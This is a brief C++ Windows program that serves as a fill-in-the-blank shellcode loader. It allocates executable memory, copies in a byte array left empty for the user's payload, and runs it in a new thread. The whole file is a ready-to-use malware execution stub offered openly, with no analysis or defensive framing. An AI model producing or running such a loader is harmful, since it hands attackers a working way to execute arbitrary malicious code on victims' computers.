#include <iostream>
#include <windows.h>

// ::::: Input your shellcode bytes here ::::::
unsigned char shellcode[] = "";
// ::::: Input your shellcode bytes here ::::::


int main() {
    // Allocate executable memory buffer via VirtualAlloc
    LPVOID shellcodeRaw = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!shellcodeRaw) {
        std::cout << "Memory allocation failed" << std::endl;
        return 0;
    }

    // Copy shellcode to the allocated memory buffer
    RtlMoveMemory(shellcodeRaw, shellcode, sizeof(shellcode));

    // Change memory protection to execute-only and save the old protection flags
    DWORD oldprotect;
    VirtualProtect(shellcodeRaw, sizeof(shellcode), PAGE_EXECUTE_READ, &oldprotect);

    // Create a new thread to execute the shellcode from the memory buffer
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellcodeRaw, NULL, 0, NULL);
    
    if (!hThread) {
        std::cout << "Thread creation failed" << std::endl;
        VirtualFree(shellcodeRaw, 0, MEM_RELEASE);
        return 0;
    }
    
    // Wait for the thread to finish execution
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    
    // Clean up allocated memory
    VirtualFree(shellcodeRaw, 0, MEM_RELEASE);
    
    return 0;
}